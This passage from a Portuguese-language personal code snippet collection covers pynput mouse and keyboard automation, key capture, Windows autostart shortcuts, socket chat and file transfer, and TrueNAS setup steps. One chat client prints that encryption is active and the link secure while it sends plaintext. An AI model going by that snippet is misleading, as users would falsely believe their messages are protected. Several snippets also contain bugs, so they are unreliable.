encontrar_ponto_vermelho(frame)\n\nif ponto_vermelho:\n    x, y = ponto_vermelho\n    print(f'Ponto vermelho encontrado em: {x}, {y}')\n    \n    # Move e clica no ponto vermelho\n    mover_e_clicar(x, y)\nelse:\n    print('Nenhum ponto vermelho encontrado.')\n", "categoria": "mouse teclado"}, "pynput - faz o mouse girar em orbita": {"codigo": "import math\nfrom pynput.mouse import Controller\nimport time\n\n# Cria o controlador do mouse\nmouse = Controller()\n\n# Ponto central da \u00f3rbita\ncentro_x = 500\ncentro_y = 500\n\n# Raio da \u00f3rbita\nraio = 200\n\n# N\u00famero de passos para completar uma \u00f3rbita\npassos = 300\n\ndef mover_em_orbita(centro_x, centro_y, raio, passos):\n    for i in range(passos):\n\t# Calcula o \u00e2ngulo atual\n\tangulo = 2 * math.pi * i / passos\n\t# Calcula as coordenadas x e y com base no \u00e2ngulo e no raio\n\t x = int(centro_x + raio * math.cos(angulo))\n\ty = int(centro_y + raio * math.sin(angulo))\n\t# Move o mouse para a coordenada (x, y)\n\t mouse.position = (x, y)\n\t# Aguarda um pouco para garantir que o movimento foi completado\n\ttime.sleep(0.03)\n\n# Chama a fun\u00e7\u00e3o para mover o mouse em \u00f3rbita\nwhile True:\n\tmover_em_orbita(centro_x, centro_y, raio, passos)", "categoria": "mouse teclado"}, "pynput - captura a teclas pressionadas": {"categoria": "teclado", "codigo": "from pynput import keyboard\nimport threading\n\n#Captura do teclado por press\u00e3o\ndef on_press(key):\n\ttry:\n\t\tprint(f'Tecla pressionada:{key.char}')\n\texcept AttributeError:\n\t\tprint(f'Tecla especial pressionada:{key}')\n\n#Para a captura do teclado\ndef on_release(key):\n\tif key == keyboard.Key.esc:\n\t\treturn False\n\t\t\n\t\ndef work():\n\tlistener_keyboard = keyboard.Listener(on_press=on_press,on_release=on_release)\n\tlistener_keyboard.start()\n\tlistener_keyboard.join()\n\t\nworker_thread = threading.Thread(target=work)\nworker_thread.start()\n\n\n\n#####################################################################\n\nfrom pynput import keyboard\n\n\ndef on_press(key):\n\ttry:\n\t\tprint(f'Tecla pressionada: {key.char}')\n\t\tlista.append(key.char)\n\texcept AttributeError:\n\t\tprint(f'Tecla especial pressionada: {key}')\n\t\tlista.append(key)\n        \n\ndef on_release(key):\n\tif key == keyboard.Key.esc:\n\t\t# Parar o listener\n\t\treturn False\n\n# Configura o listener do teclado\nwith keyboard.Listener(\n\t\ton_press=on_press,\n\t\ton_release=on_release) as listener:\n\tlistener.join()\n\n\n\n######################################################################"}, "pynput - digita o conteudo de uma lista": {"codigo": "from pynput.keyboard import Controller\nimport time\n\n# Cria o controlador do teclado\nteclado = Controller()\n\n# Lista de strings a serem digitadas\nlista_de_strings = [\n    \"amizade\", \"felicidade\", \"amor\", \"esperan\u00e7a\", \"paz\"]\n\n\ndef digitar_lista(lista):\n\tfor item in lista:\n\t\tfor char in item:\n\t\t\tteclado.type(char)\n\t\t\ttime.sleep(0.02)  # Aguarda um pouco entre cada caractere para simular a digita\u00e7\u00e3o humana\n\t\ttime.sleep(0.3)  # Aguarda um pouco entre cada string\n\t\tteclado.type(\" \")\n# Chama a fun\u00e7\u00e3o para digitar o conte\u00fado da lista\ndigitar_lista(lista_de_strings)\n", "categoria": "teclado"}, "cria atalho para inicializar script junto com o computador": {"codigo": "import os\nimport sys\nimport shutil\nimport win32com.client\n\ndef criar_atalho(startup_path, target, shortcut_name):\n\tshell = win32com.client.Dispatch(\"WScript.Shell\")\n\tshortcut_path = os.path.join(startup_path, f\"{shortcut_name}.lnk\")\n\tshortcut = shell.CreateShortCut(shortcut_path)\n\tshortcut.Targetpath = target\n\tshortcut.WorkingDirectory = os.path.dirname(target)\n\tshortcut.save()\n\ndef adicionar_a_startup(nome_do_script):\n\t# Caminho da pasta de inicializa\u00e7\u00e3o do Windows\n\tstartup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n\t\n\t# Caminho completo do script Python\n\tscript_path = os.path.abspath(nome_do_script)\n\t\n\t# Nome do atalho\n\tnome_atalho = os.path.splitext(os.path.basename(nome_do_script))[0]\n\t\n\t# Cria o atalho\n\tcriar_atalho(startup_path, script_path, nome_atalho)\n\nif __name__ == \"__main__\":\n\t# Nome do seu script Python\n\tnome_do_script = \"meu_script.py\"\n\t\n\t# Adiciona o script \u00e0 inicializa\u00e7\u00e3o do Windows\n\tadicionar_a_startup(nome_do_script)\n\tprint(\"O script foi adicionado \u00e0 inicializa\u00e7\u00e3o do Windows com sucesso.\")", "categoria": "Python Geral"}, "pynput - mouse teclado capturar mouse e teclado ao mesmo tempo": {"codigo": "import json\nfrom pynput import keyboard\nfrom pynput import mouse\nimport threading\n\nestoque = {}\n\ndef importar_estoque_json():\n\ttry:\n\t\twith open('estoque.json', 'r') as file:\n\t\t\tcontent = file.read()\n\t\t\tif content:\n\t\t\t\testoque.update(json.loads(content))\n\texcept (FileNotFoundError, json.JSONDecoderError):\n\t\tpass\n\ndef on_click(x, y, button, pressed):\n\tif pressed:\n\t\tprint(f'{x}   {y}')\n\t\n\n\n\ndef on_press(key):\n\ttry:\n\t\t\n\t\tif key == keyboard.Key.tab:\n\t\t\tprint('Gravar coordenadas')\n\t\t\n\t\tif key == keyboard.Key.shift:\n\t\t\tprint('Parar gravar coordenadas')\n\t\t\n\t\tif key == keyboard.Key.esc:\n\t\t\tprint('Iniciar processo de inser\u00e7\u00e3o')\n\t\t\n\t\tif key == keyboard.Key.ctrl_l:\n\t\t\tprint('Parar o processo de inser\u00e7\u00e3o')\n\t\n\t\n\texcept AttributeError:\n\t\tprint(f'Tecla especial: {key}')\n\t\t\ndef on_release(key):\n\ttry:\n\t\tif key == keyboard.Key.ctrl_l:\n\t\t\tprint(f'Encerrado')\n\t\t\treturn False\n\texcept:\n\t\tpass\n\t\t\n\ndef start_listeners():\n\tprint('inicializado')\n\tlistener = keyboard.Listener(on_press=on_press, on_release=on_release)\n\tlistener.start()\n\t\n\n\tlistener_mouse = mouse.Listener(on_click=on_click)\n\tlistener_mouse.start()\n\t\n\tlistener.join()\n\tlistener_mouse.join()\n\t\t\nlistener_thread = threading.Thread(target=start_listeners)\nlistener_thread.start()\n\n", "categoria": "mouse teclado"}, "threading - processamento em paralelo": {"categoria": "Python Geral", "codigo": "\ncaso precise que o programa espere a thread para continuar a funcionar, \nutilize o 'worker_thread.join()', o worker_thread \u00e9 so um nome qualquer,\nuse o .join()\n\n##############################################################\nimport threading\nimport time\n\nclass MinhaThread(threading.Thread):\n    def __init__(self):\n        super().__init__()\n        self._stop_event = threading.Event()\n\n    def run(self):\n        while not self._stop_event.is_set():\n            print(\"Thread em execu\u00e7\u00e3o...\")\n            time.sleep(1)\n    \n    def stop(self):\n        self._stop_event.set()\n\n# Cria\u00e7\u00e3o da thread\nthread = MinhaThread()\nthread.start()\n\n# Executa por 5 segundos e depois para\ntime.sleep(5)\nthread.stop()\nthread.join()\nprint(\"Thread terminada\")\n\n\n\n\n###########################################################\nimport threading\n\nestado_loop = False\nstop_loop = False\npause_loop = False\npause_event = threading.Event()\npause_event.set() #Inicia n\u00e3o pausado\n\n\ndef worker():\n\tglobal stop_loop, pause_loop\n\ta = 0\n\t\n\tfor i in range(100000000):\n\t\tpause_event.wait()\n\t\t\n\t\tif stop_loop:\n\t\t\tbreak\n\t\ta += 1\n\t\n\t\n\tprint(f'\\n{a}')\n\tstop_loop = False\n\t\t\nwhile True:\n\tcomando = input('Comando:')\n\t\n\tif comando == 'c':\n\t\tif estado_loop == True:\n\t\t\tprint('C\u00e1lculo j\u00e1 foi iniciado')\t\t\n\t\t\n\t\tif estado_loop == False:\n\t\t\testado_loop = True\n\t\t\tprint('Iniciado')\n\t\t\tworker_thread = threading.Thread(target=worker)\n\t\t\tworker_thread.start()\n\n\t\t\n\tif comando == 's':\n\t\tstop_loop = True\n\t\tprint('Encerrado por escolha')\n\t\t\n\tif comando == 'p':\n\t\tif pause_event.is_set():\n\t\t\tpause_event.clear()\n\t\t\tprint('Pausado')\n\t\telse:\n\t\t\tprint('Despausado')\n\t\t\tpause_event.set()\n\t\t\n\t\t\n\t\n\t\t\n\n\t\t\n\n\n"}, "automatizando mouse + teclado usando threading": {"codigo": "import json\nfrom pynput import keyboard\nfrom pynput import mouse\nfrom pynput.mouse import Button, Controller as MouseController\nfrom pynput.keyboard import Controller as KeyboardController\nimport threading\nimport time\n\nstop_loop = False\ndef importar_estoque_json():\n\ttry:\n\t\twith open('estoque.json', 'r') as file:\n\t\t\tcontent = file.read()\n\t\t\tif content:\n\t\t\t\testoque.update(json.loads(content))\n\texcept (FileNotFoundError, json.JSONDecoderError):\n\t\tpass\n\ndef on_click(x, y, button, pressed):\n\tglobal gravar_coordenadas\n\tif pressed:\n\t\tcoordenada = (x, y)\n\t\t\n\t\tif gravar_coordenadas == True:\n\t\t\tcoordenadas.append(coordenada)\n\t\t\tprint(coordenadas)\n\t\t\n\t\tif gravar_coordenadas == False:\n\t\t\tpass\n\n\n\n\ndef on_press(key):\n\tglobal gravar_coordenadas\n\tglobal processo_insercao\n\tglobal stop_loop\n\ttry:\n\t\t#print(key.char)\n\t\t\n\t\tif key == keyboard.Key.tab:\n\t\t\tprint('Gravando coordenadas...')\n\t\t\t\n\t\t\tgravar_coordenadas = True\n\n\t\t\n\t\tif key == keyboard.Key.shift:\n\t\t\tprint('Grava\u00e7\u00e3o interrompida!')\n\t\t\tgravar_coordenadas = False\n\t\t\n\t\tif key == keyboard.Key.enter:\n\t\t\tprint('Iniciar processo de inser\u00e7\u00e3o')\n\t\t\tautomacao_thread.start()\n\t\t\t\n\t\t\t#mover_e_clicar(coordenadas)\n\t\t\n\t\tif key == keyboard.Key.shift:\n\t\t\tprint('Parar o processo de inser\u00e7\u00e3o')\n\t\t\tprocesso_insercao = False\n\t\t\tstop_loop = True\n\t\t\t\n\t\t\tprint(f'{processo_insercao} ctrl parar')\n\t\n\t\n\texcept AttributeError:\n\t\tprint(f'Tecla especial: {key}')\n\t\t\ndef on_release(key):\n\ttry:\n\t\tif key == keyboard.Key:\n\t\t\tprint(f'Encerrado')\n\t\t\treturn False\n\texcept:\n\t\tpass\n\t\t\n\n\n\n\ndef mover_e_clicar(coordenadas):\n\tglobal stop_loop\n\ttim = 0.3\n\tmouse = MouseController()\n\tteclado = KeyboardController()\n\titens = 0\n\tfor item_dic, info_dic in estoque.items():\n\t\tprint(stop_loop)\n\t\tif stop_loop:\n\t\t\tbreak\n\t\t\t\n\t\tif itens == 10:\n\t\t\tbreak\n\t\tcoordenada_codigo = coordenadas[0]\n\t\tcoordenada_item = coordenadas[1]\n\t\tcoordenada_marca = coordenadas[2]\n\t\tcoordenada_localizacao = coordenadas[3]\n\t\tcoordenada_preco_venda = coordenadas[4]\n\t\tcoordenada_custo = coordenadas[5]\n\t\tcoordenada_quantidade = coordenadas[6]\n\t\tcoordenada_confirmar = coordenadas[7]\n\t\t\n\t\t#Codigo\n\t\tmouse.position = coordenada_codigo\n\t\ttime.sleep(tim)\n\t\tmouse.click(Button.left,1)\n\t\ttime.sleep(tim)\n\t\tteclado.type(info_dic['codigo'])\n\t\t\n\t\t#Item\n\t\tmouse.position = coordenada_item\n\t\ttime.sleep(tim)\n\t\tmouse.click(Button.left, 1)\n\t\ttime.sleep(tim)\n\t\tteclado.type(item_dic)\n\t\t\n\t\t#marca\n\t\tmouse.position = coordenada_marca\n\t\ttime.sleep(tim)\n\t\tmouse.click(Button.left,1)\n\t\ttime.sleep(tim)\n\t\tif info_dic['marca'] == '':\n\t\t\tteclado.type('sem marca')\n\t\telse:\n\t\t\tteclado.type('metalbo')\n\t\t\n\t\t#Localiza\u00e7\u00e3o\n\t\tmouse.position = coordenada_localizacao\n\t\ttime.sleep(tim)\n\t\tmouse.click(Button.left,1)\n\t\ttime.sleep(tim)\n\t\tteclado.type('sem localiza\u00e7\u00e3o')\n\t\t\n\t\t#preco_venda\n\t\tmouse.position = coordenada_preco_venda\n\t\ttime.sleep(tim)\n\t\tmouse.click(Button.left,1)\n\t\ttime.sleep(tim)\n\t\tteclado.type(str(info_dic['valor']))\n\t\t\n\t\t#Custo\n\t\tmouse.position = coordenada_custo\n\t\ttime.sleep(tim)\n\t\tmouse.click(Button.left,1)\n\t\ttime.sleep(tim)\n\t\tteclado.type(str(info_dic['custo']))\n\t\t\n\t\t#quantidade\n\t\tmouse.position = coordenada_quantidade\n\t\ttime.sleep(tim)\n\t\tmouse.click(Button.left,1)\n\t\ttime.sleep(tim)\n\t\tteclado.type(str(info_dic['quantidade']))\n\t\t\n\t\t#confirmar\n\t\tmouse.position = coordenada_confirmar\n\t\ttime.sleep(tim)\n\t\tmouse.click(Button.left,1)\n\t\ttime.sleep(2)\n\n\t\titens += 1\n\ndef start_listeners():\n\tprint('inicializado')\n\tlistener = keyboard.Listener(on_press=on_press, on_release=on_release)\n\tlistener.start()\n\t\n\n\tlistener_mouse = mouse.Listener(on_click=on_click)\n\tlistener_mouse.start()\n\t\n\tlistener.join()\n\tlistener_mouse.join()\n\t\ndef mover_e_clicar_process():\n\tprocesso = mover_e_clicar(coordenadas)\n\t#processo.start()\n\t\n\n\t\t\nestoque = {}\ncoordenadas = [(533, 144), \n(531, 172), \n(522, 257), \n(509, 312), \n(508, 340), \n(506, 368), \n(502, 396), \n(508, 422)]\ngravar_coordenadas = False\nprocesso_insercao = True\t\t\n\t\t\t\n\nimportar_estoque_json()\t\nlistener_thread = threading.Thread(target=start_listeners)\nlistener_thread.start()\n\nautomacao_thread = threading.Thread(target=mover_e_clicar_process)\n\n\n", "categoria": "mouse teclado"}, "multiprocessing - processar nos n\u00facleos diferentes do processador": {"codigo": "import multiprocessing\n\ndef worker(num):\n\t\n\tif num == 0:\n\t\ta = 0\n\t\tfor i in range(1000000000):\n\t\t\ta += 1\n\t\tprint(f'a = {a}')\n\t\n\tif num == 1:\n\t\tb = 0\n\t\tfor i in range(1000000000):\n\t\t\tb +=(1 *9 /2.3)\n\t\tprint(f'b = {b}')\n\t\n\tif num == 2:\n\t\tc = 0\n\t\tfor i in range(100000):\n\t\t\tc += 65 * 32\n\t\tprint(f'c = {c}')\n\t\t\n\tif num == 3:\n\t\td = 0\n\t\tfor i in range(10000000000):\n\t\t\td += 55 ^ 3\n\t\tprint(f'd = {d}')\n\t\t\n\t\t\nif __name__ == '__main__':\n\tprocess = []\n\tfor i in range(4):\n\t\tp = multiprocessing.Process(target=worker, args=(i,))\n\t\tprocess.append(p)\n\t\tp.start()\n\t\t\n\tfor p in process:\n\t\tp.join()\n\t\t'''\n\t\to join() faz o programa principal esperar o processamento\n\t\tou seja, faz parte da continuidade do programa.\n\t\t'''\n", "categoria": "Python Geral"}, "tesseract - reconhecimento de texto em imagem": {"codigo": "baixar o tesseract nesse link:\nhttps://github.com/UB-Mannheim/tesseract/wiki\nidenficiar o diret\u00f3rio para usar no programa\n\nC:/Program Files/Tesseract-OCR/tesseract.exe\n\nbaixe a lingua que vai usar no link abaixo:\nhttps://github.com/tesseract-ocr/tessdata\nmova a lingua para o diretorio.\n\n\npip install Pillow\npip install pytesseract\n\n\n\n\nfrom PIL import Image\nimport pytesseract\n\n# Carregar a imagem\nimagem_path = 'im.webp'\nimagem = Image.open(imagem_path)\n\npytesseract.pytesseract.tesseract_cmd = 'C:\\Program Files\\Tesseract-OCR\\tesseract.exe'\n#texto = pytesseract.image_to_string(imagem, lang=\"por\") #\n\n\n# Extrair texto da imagem\ntexto_extraido = pytesseract.image_to_string(imagem)\n\n# Exibir o texto extra\u00eddo\nprint(\"Texto extra\u00eddo da imagem:\")\nprint(texto_extraido)\n\n# Extrair palavras individuais\npalavras = texto_extraido.split()\n\n# Exibir as palavras individualmente\nprint(\"\\nPalavras encontradas na imagem:\")\nfor palavra in palavras:\n    print(palavra)\n", "categoria": "Python Geral"}, "atalho - ctrl + g ": {"categoria": "teclado", "codigo": "from pynput import keyboard\nimport threading\nimport time\n'''\nQuando chamamos o thread em outro lugar, se paramos de processar\na opera\u00e7\u00e3o que est\u00e1 dentro do thread, devemos criar uma nova thread\nn\u00e3o \u00e9 poss\u00edvel reinicia-lo.\nComo por exemplo na linha 27 na fun\u00e7\u00e3o on_press()\n\n\n'''\n# Vari\u00e1vel global para verificar se Ctrl est\u00e1 pressionado\nctrl_pressed = False\nstop_loop = False\n\n# Captura do teclado por press\u00e3o\ndef on_press(key):\n\tglobal ctrl_pressed\n\tglobal stop_loop\n\t\n\n\tif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:\n\t\tctrl_pressed = True\n\ttry:\t\n\t\tprint(key.char)\n\t\tif ctrl_pressed and key.char == 'g':\n\t\t\tprint('gooll')\n\t\t\tprocess_thread = threading.Thread(target=process)\n\t\t\tprocess_thread.start()\n\t\t\tctrl_pressed = False\n\t\t\n\t\tif ctrl_pressed and key.char == 'p':\n\t\t\tstop_loop = True\n\t\t\tctrl_pressed = False\n\t\t\tprocess_thread.stop()\n\t\t\tprint('Loop encerrado')\n\t\t\t\n\t\t\t\t\n\texcept:\n\t\tpass\n\n\n\n# Para a captura do teclado\ndef on_release(key):\n\tglobal ctrl_pressed\n\n\t#if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:\n\t\t#ctrl_pressed = False\n\n\tif key == keyboard.Key.esc:\n\t\treturn False\n\ndef work():\n\tlistener_keyboard = keyboard.Listener(on_press=on_press, on_release=on_release)\n\tlistener_keyboard.start()\n\tlistener_keyboard.join()\n\ndef process():\n\tglobal stop_loop\n\tprint('chamado')\n\t\n\t\n\ta = 0\n\tfor i in range(100000000):\n\t\tif stop_loop:\n\t\t\tstop_loop = False\n\t\t\tbreak\n\t\ta += 1\n\t\tprint(a)\n\tprint(f'{a}')\n\n\nworker_thread = threading.Thread(target=work)\nworker_thread.start()\n\nprocess_thread = threading.Thread(target=process)\n\n"}, "enviando characteres entre computadores atraves da internet": {"categoria": "conexao - servidor client", "codigo": "import socket\nimport threading\n\nmensagem = \"\"\n\ndef start_server():\n\tglobal mensagem\n\tserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\tserver_socket.bind(('10.0.0.104', 80))  # IP e Porta do servidor\n\tserver_socket.listen(2)  # Escuta uma conex\u00e3o\n\n\tprint(\"Servidor aguardando conex\u00e3o...\")\n\n\tconn, addr = server_socket.accept()\n\tprint(f\"Conex\u00e3o estabelecida com {addr}\")\n\tprint('Tatiane est\u00e1 online')\n\n\twhile True:\n\t\tdata = conn.recv(1024)  # Recebe dados do cliente\n\t\tif data:\n\t\t\tprint(f\"Tatiane: {data.decode()}\")\n\t\tmensagem = input('Voc\u00ea: ')\n\t\tconn.sendall(mensagem.encode())\n\n\tconn.close()\n\tserver_socket.close()\n\ndef mostrar():\n\tglobal mensagem\n\twhile True:\n\t\tif mensagem:\n\t\t\tprint(f'Tatiane: {mensagem}')\n\t\t\tmensagem = \"\"\n\nif __name__ == \"__main__\":\n\tworker_thread = threading.Thread(target=start_server)\n\tworker_thread.start()\n\tmostrar_thread = threading.Thread(target=mostrar)\n\tmostrar_thread.start()\n\n\n\n#############################################################\nimport socket\nimport threading\nimport time\n\ndef send_message():\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client_socket.connect(('10.0.0.104', 80))  # IP e Porta do servidor\n\n    print('Conectando ao Servidor: 10.0.0.104')\n    time.sleep(3)\n    print('Aguardando Conex\u00e3o')\n    time.sleep(2)\n    print('Conex\u00e3o estabelecida')\n    time.sleep(2)\n    print('Ativando criptografia de mensagens')\n    time.sleep(1)\n    print('Seguro')\n    print('Troque uma ideia')\n    print('##########################################')\n\n    try:\n        while True:\n            mensagem = input('Voc\u00ea: ')\n            client_socket.sendall(mensagem.encode())\n\n            # Recebe dados do servidor (Tatiane)\n            data = client_socket.recv(1024)\n            if not data:\n                print(\"Conex\u00e3o encerrada pelo servidor\")\n                break\n            print(f\"Samuel: {data.decode()}\")\n\n    except KeyboardInterrupt:\n        print(\"\\nEncerrando cliente...\")\n    finally:\n        client_socket.close()\n\nif __name__ == \"__main__\":\n    send_message_thread = threading.Thread(target=send_message)\n    send_message_thread.start()\n"}, "conexao - servido cliente transferindo arquivos": {"codigo": "import socket\n\ndef start_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('0.0.0.0', 12345))  # IP e Porta do servidor\n    server_socket.listen(1)  # Escuta uma conex\u00e3o\n\n    print(\"Servidor aguardando conex\u00e3o...\")\n\n    conn, addr = server_socket.accept()\n    print(f\"Conex\u00e3o estabelecida com {addr}\")\n\n    with open('foto_recebida.jpg', 'wb') as f:  # Abre um arquivo para escrever em modo bin\u00e1rio\n        while True:\n            data = conn.recv(1024)  # Recebe dados do cliente\n            if not data:\n                break\n            f.write(data)  # Escreve os dados recebidos no arquivo\n\n    print(\"Foto recebida com sucesso\")\n    conn.close()\n    server_socket.close()\n\nif __name__ == \"__main__\":\n    start_server()\n\n\n\n#########################################################\n\n\nimport socket\n\ndef send_photo():\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client_socket.connect(('127.0.0.1', 12345))  # IP e Porta do servidor\n\n    file_path = input('Digite o caminho da foto (jpeg) para enviar: ')\n    try:\n        with open(file_path, 'rb') as f:  # Abre o arquivo para leitura em modo bin\u00e1rio\n            while True:\n                data = f.read(1024)  # L\u00ea 1024 bytes do arquivo\n                if not data:\n                    break\n                client_socket.sendall(data)  # Envia os dados lidos para o servidor\n        print(\"Foto enviada com sucesso\")\n    except FileNotFoundError:\n        print(\"Arquivo n\u00e3o encontrado\")\n    \n    client_socket.close()\n\nif __name__ == \"__main__\":\n    send_photo()\n", "categoria": "conexao - servidor client"}, "Baixar e instalar o TrueNas.": {"codigo": "1) Baixa a iso do programa no site truenas.com, vai entrea em Get truenas e vai clicar em baixa TrueNas scale e vai at\u00e9 la embaixo e clica em No Thank YOU......\n\n2) Deve transformar o pendriver em bootavel, usando o ventoy \nhttps://www.ventoy.net/en/download.html, \nextraia a pasta do ventoy que est\u00e1 em seu computador e execute o Ventoy2Disk, selecione o pendrive utilizado.\n\n3) Copie e cole a iso do TrueNas para dentro do pendrive. Ejete o pendrive.\n\n4) Ligue o servidor e entre na bios(f2, del, esc) e selecione a prefer\u00eancia de boot.\nCaso n\u00e3o esteja reconhecendo o pendrive, v\u00e1 em ADVANCED BIOS > ON BOARDS DEVICES  e habiliete o USB2.0 por exemplo volte na prefer\u00eancia do boot e selecione o pendrive)\n\n5) Vai abrir o Ventoy e tu clica no Boot in normal mode e clique posteriormente em Start TruNas Installation.\n\n6) Quando chegar no instalador, selecione o Install/Upgrade. Selecione onde est\u00e1 a iso do servidor, cuidado para n\u00e3o escolher outro HD, assim tudo ser\u00e1 apagado para instala\u00e7\u00e3o. Fa\u00e7a os processos intuitivos.\n\n7) Criar o swap do sistema de ram caso seja oferecido.\n\n8)Allow EFI boot? <yes>\nEspere.\n\n9) Fa\u00e7a o Reboot e retire o pendrive de boot.\nanote o endere\u00e7o de IP e digite no navegador de um outro computador na mesma rede.\n\n10) Fa\u00e7a o login que acabou de fazer na instala\u00e7\u00e3o.", "categoria": "servidor NAS - TRUENAS"}, "TrueNas - servidor": {"categoria": "servidor NAS - TRUENAS", "codigo": "1) Crie primeiro a pool.\n- Coloque o nome da pool.\n- Escolha o layout do HD de particionamento.\n\t- Raidz1 = Raid 5(particionado fragmentado)\n\t-Mirror\n- Automated Disk Selection\n\nAo chegar ao final temos uma linha que resume a pool \n clique em create pool. (O conte\u00fado dos discos \u00e9 apagado!!!!!)\n\n2) V\u00e1 em Shares e clique no SWB >add >selecione o caminho da pasta que criou antes, verifique se o check boxEnabled esteja marcado, clique em save e aparece uma janela com uma mensagem a respeito do SMB, Enable this service start automatically. marque aceitando pois o SMB ser\u00e1 inicializado junto com o sistema operacional, isso \u00e9 \u00fatil caso a energia caia por exemplo e clique em Enable Service.\n\n\n3) Em seguida vamos criar um usu\u00e1rio. \nCREDENCIAL > LOCAL USERS > Add.\nCREATE HOME DIRECTORY\nSE N\u00c3O MARCAR O USU\u00c1RIO TEM ACESSO A TODA A POOL\nSAMBA AUTHENTICATION MARCADA.\nSAVE.\n\npreencha os dados selecione a pasta da pool a pasta que criou antes, caso quira criar mais pastas v\u00e1 em DATASETS> ADD DATASET\n\n\n4) Abra o explorador de Arquivos.(Caso n\u00e3o apare\u00e7a, v\u00e1 em PAINEL DE CONTROLE>INTERNET REDE>ALTERAR AS CONFIGURA\u00c7\u00d5ES DE COMPATILHAMENTO AVAN\u00c7ADAS(ATIVE DESCOBERTA DE REDE))\n\n5) Entre no TrueNas e autentique-se com o loguin e senha de usu\u00e1rio.\n\n6) Pronto j\u00e1 est\u00e1 funcionando."}, "Error em HD - subtitui\u00e7\u00e3o do HD": {"codigo": "0) DashBoard(Storage)\n1) Deslige o servidor.\n2) Troque o HD.\n3) \nVerifique a sess\u00e3o de discos, ver\u00e1 um N/A\nSTORAGE > UNASSIGNED DISKS > ADD TO POOL > EXISTING POOL > NOME DA POOL> LAYOUT = LAYOUT ANTERIOR DE RAID 0, 1, 5, 6 .... >DISK SIZE > LOG = LAYOUT ANTIGO > DISK SIZE > OS DADOS DO HD NOVO SER\u00c3O TODOS APAGADOS.\n", "categoria": "servidor NAS - TRUENAS"}, "erro no hardware": {"codigo": "1) Instale o TrueNas de novo em um HardWare novo.\n\n2) CUIDADO!!!!!!!!!!!!!!!!!!!!!!!!!! SELECIONE O NOVO LUGAR ONDE VAI SER INTALADO O SISTEMA OPERACIONAL, POIS PARA INSTALAR O SISTEMA OPERACIONAL O HD OU SSD OU PENDRIVE SER\u00c1 FORMTADO, SE ESCOLHER ERRADO PERDER\u00c1 TODOS OS DADOS. PRESTE MUITA ATEN\u00c7\u00c3O!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n3)Loge no servidor atrav\u00e9s do ip\nSTORAGE > IMPORT POOL > a pool antiga deve aparecer para sele\u00e7\u00e3o > REFAZER AS CREDENCIAIS.", "categoria": "servidor NAS - TRUENAS"}, "verificando conexao": {"codigo": "CMD\n\nTente pingar o servidor TrueNAS para verificar se ele est\u00e1 acess\u00edvel\n\nping <IP_do_TrueNAS>\n\nDelete o mapeamento de rede\n\nnet use N: /delete\n\n\n\nReinicie o servi\u00e7o SMB no TrueNAS:\nsystemctl restart samba\n\n\n\u00c0s vezes, o Windows pode estar usando um cache de rede que est\u00e1 desatualizado. Para limpar o cache de rede:\n\nipconfig /flushdns\n\n", "categoria": "servidor NAS - TRUENAS"}, "Criando dataset": {"codigo": "Passos para Criar um Dataset Filho e Configurar o Compartilhamento SMB\nAcessar a Interface do TrueNAS:\nAbra o navegador web e acesse a interface de administra\u00e7\u00e3o do TrueNAS digitando o IP do TrueNAS (por exemplo, http://10.0.0.103).\nFa\u00e7a login com suas credenciais de administrador.\nCriar um Dataset Filho:\nNo painel de controle do TrueNAS, v\u00e1 at\u00e9 Storage -> Pools.\nEncontre o pool chamado NAS e clique no \u00edcone de tr\u00eas pontos ou diretamente no nome do pool para acessar as op\u00e7\u00f5es.\nSelecione Add Dataset para criar um novo dataset filho.\nNomeie o novo dataset, por exemplo, SHARE, e configure as op\u00e7\u00f5es conforme necess\u00e1rio. Clique em Save para criar o dataset.\nConfigurar o Compartilhamento SMB no Dataset Filho:\nV\u00e1 at\u00e9 Sharing -> Windows (SMB) Shares.\nClique em Add para criar um novo compartilhamento SMB.\nNo campo Path, navegue at\u00e9 o dataset filho que voc\u00ea criou (/mnt/NAS/SHARE).\nConfigure as permiss\u00f5es e outras op\u00e7\u00f5es de compartilhamento conforme necess\u00e1rio. Nomeie o compartilhamento, por exemplo, nas.\nClique em Save para criar o compartilhamento.\nVerificar e Configurar Permiss\u00f5es:\nDepois de criar o compartilhamento, voc\u00ea pode precisar ajustar as permiss\u00f5es para garantir que o usu\u00e1rio samuel tenha acesso ao compartilhamento.\nV\u00e1 at\u00e9 Storage -> Pools, encontre o dataset SHARE, clique no \u00edcone de tr\u00eas pontos e selecione Edit Permissions.\nAjuste as permiss\u00f5es para incluir o usu\u00e1rio samuel, garantindo que ele tenha acesso de leitura e escrita.", "categoria": "servidor NAS - TRUENAS"}, "permissoes - permissao de usuario para varias pastas com grupo": {"categoria": "servidor NAS - TRUENAS", "codigo": "1) Crie um Dataset como o nome desejado.\n2) Ative o SMB em shares.\n3) Abra o DataSet denovo, clique em permissions.\n4) Defina as permissoes do DataSet para o grupo ou para o usu\u00e1rio.\n5) Pronto, se o usu\u00e1rio estiver no grupo selecionado, ele ter\u00e1 acesso as pastas diferentes que foi configurada. Ou v\u00e1rios usu\u00e1rios podem acessar a pasta tamb\u00e9m, pode ser usu\u00e1rios ou um grupo de usu\u00e1rios.\n6) N\u00c3O SE ESQUE\u00c7A DE MARCAR APPLY USE, APPLY GROUP. para poder permitir o uso."}, "Replicar configuracoes do TruNas para outro TrueNas com dados": {"codigo": "1) BACKUP DA CONFIGURA\u00c7\u00c3O DO TRUENAS ORIGINAL\n\n1.1) Acessar a interface do TrueNas:\n\t- Abra seu navegador e acesse a interface web do trueNas original.\n\n1.2) Realizar o BackUp da configura\u00e7\u00e3o:\n\t- V\u00e1 em System > General\n\t- Clique em Save Config para baixar um arquivo de backup da configura\u00e7\u00e3o do \n\tTrueNas. Este arquivo inclui usu\u00e1rios, grupos e permiss\u00f5es.\n\n2) Configurar o Novo Servidor TrueNas:\n\n2.1) Acessar a interface do Novo TrueNas:\n\t- Abra seu navegador e acesse a interface web do novo TrueNas.\n\n2.2) Restaurar a Configura\u00e7\u00e3o:\n\t- V\u00e1 em System > General.\n\t- Clique em Upload Config e selecione o arquivo de configura\u00e7\u00e3o que 